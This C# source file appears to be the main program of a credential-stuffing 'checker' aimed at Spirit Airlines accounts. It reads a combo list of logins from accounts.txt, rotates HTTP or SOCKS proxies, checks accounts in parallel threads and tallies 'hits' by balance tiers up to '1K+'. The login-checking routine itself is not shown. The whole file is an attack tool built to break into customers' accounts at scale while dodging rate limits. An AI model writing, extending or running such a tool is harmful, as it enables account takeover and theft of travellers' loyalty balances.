using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using Spirit_Airlines.Core;

namespace Spirit_Airlines
{
    internal static class Program
    {
        public static void Main(string[] args)
        {
            Clr.InitConsole();

            var threadList = new List<Thread>();

            if (!File.Exists("accounts.txt") || !File.Exists("proxies.txt"))
            {
                Console.WriteLine($"{Clr.LtRed}[ERROR] Files (accounts.txt or proxies.txt) doesn't exist! {Clr.Reset}");
                Console.ReadLine();
                Environment.Exit(1);
            }

            File.ReadAllLines("accounts.txt").ToList().ForEach(Globals.Queue.Add);
            File.ReadAllLines("proxies.txt").ToList().ForEach(Globals.Proxies.Add);

            Console.Write($"{Clr.LtCyan}[{Clr.White}?{Clr.LtCyan}] Threads: {Clr.Reset}");
            Globals.Threads = Convert.ToInt16(Console.ReadLine());

            Console.Write($"{Clr.LtCyan}[{Clr.White}?{Clr.LtCyan}] Show Bad [1 - Yes, 2 - No]: {Clr.Reset}");
            Globals.OutputBad = Convert.ToInt16(Console.ReadLine());

            Console.Write($"{Clr.LtCyan}[{Clr.White}?{Clr.LtCyan}] Show Custom [1 - Yes, 2 - No]: {Clr.Reset}");
            Globals.OutputCustom = Convert.ToInt16(Console.ReadLine());

            Globals.EProxyType = GetUserProxy();

            if (!Directory.Exists("Results")) Directory.CreateDirectory("Results");
            if (!Directory.Exists(Globals.ResultsPath)) Directory.CreateDirectory(Globals.ResultsPath);

            Task.Factory.StartNew(Checker.TitleUpdater);
            Task.Factory.StartNew(Checker.CpmCounter);
            Stats.ComboCount = Globals.Queue.Count;

            for (var i = 0; i < Globals.Threads; i++)
            {
                var t = new Thread(() =>
                {
                    while (!Globals.Queue.IsEmpty)
                    {
                        if (!Globals.Queue.TryTake(out var account)) continue;
                        Checker.Check(account);
                    }
                });

                t.Start();
                threadList.Add(t);
            }

            foreach (var task in threadList)
                task.Join();

            Stats.Finished = true;
            Console.Clear();

            Console.WriteLine($"{Clr.LtGreen}[HITS] {Stats.Working}{Clr.Reset}");
            Console.WriteLine($"{Clr.LtYellow}[CUSTOM] {Stats.Custom}{Clr.Reset}");
            Console.WriteLine($"{Clr.LtRed}[BAD] {Stats.Invalid}{Clr.Reset}\n");

            Console.WriteLine($"{Clr.LtMagenta}[50] {Stats._50}{Clr.Reset}");
            Console.WriteLine($"{Clr.LtMagenta}[100] {Stats._100}{Clr.Reset}");
            Console.WriteLine($"{Clr.LtMagenta}[150] {Stats._150}{Clr.Reset}\n");

            Console.WriteLine($"{Clr.LtMagenta}[200] {Stats._200}{Clr.Reset}");
            Console.WriteLine($"{Clr.LtMagenta}[250] {Stats._250}{Clr.Reset}");
            Console.WriteLine($"{Clr.LtMagenta}[300] {Stats._300}{Clr.Reset}\n");

            Console.WriteLine($"{Clr.LtMagenta}[350] {Stats._350}{Clr.Reset}");
            Console.WriteLine($"{Clr.LtMagenta}[400] {Stats._400}{Clr.Reset}");
            Console.WriteLine($"{Clr.LtMagenta}[450] {Stats._450}{Clr.Reset}\n");

            Console.WriteLine($"{Clr.LtMagenta}[500] {Stats._500}{Clr.Reset}");
            Console.WriteLine($"{Clr.LtMagenta}[550] {Stats._550}{Clr.Reset}");
            Console.WriteLine($"{Clr.LtMagenta}[600] {Stats._600}{Clr.Reset}\n");

            Console.WriteLine($"{Clr.LtMagenta}[650] {Stats._650}{Clr.Reset}");
            Console.WriteLine($"{Clr.LtMagenta}[700] {Stats._700}{Clr.Reset}");
            Console.WriteLine($"{Clr.LtMagenta}[750] {Stats._750}{Clr.Reset}\n");

            Console.WriteLine($"{Clr.LtMagenta}[800] {Stats._800}{Clr.Reset}");
            Console.WriteLine($"{Clr.LtMagenta}[850] {Stats._850}{Clr.Reset}");
            Console.WriteLine($"{Clr.LtMagenta}[900] {Stats._900}{Clr.Reset}");
            Console.WriteLine($"{Clr.LtMagenta}[1K+] {Stats._1000m}{Clr.Reset}\n");

            Console.ReadLine();
        }

        private static ProxyType GetUserProxy()
        {
            var proxyTypes = new Dictionary<int, ProxyType>
            {
                {1, ProxyType.HTTP},
                {2, ProxyType.Socks4},
                {3, ProxyType.Socks5}
            };

            while (true)
            {
                try
                {
                    Console.Write($"{Clr.LtCyan}[{Clr.White}?{Clr.LtCyan}] ProxyType [1 - Http/S, 2 - Socks4, 3 - Socks5]: {Clr.Reset}");
                    var proxyNumber = Convert.ToInt16(Console.ReadLine());

                    return proxyTypes[proxyNumber];
                }
                catch
                {
                    //ignored
                }
            }
        }
    }
}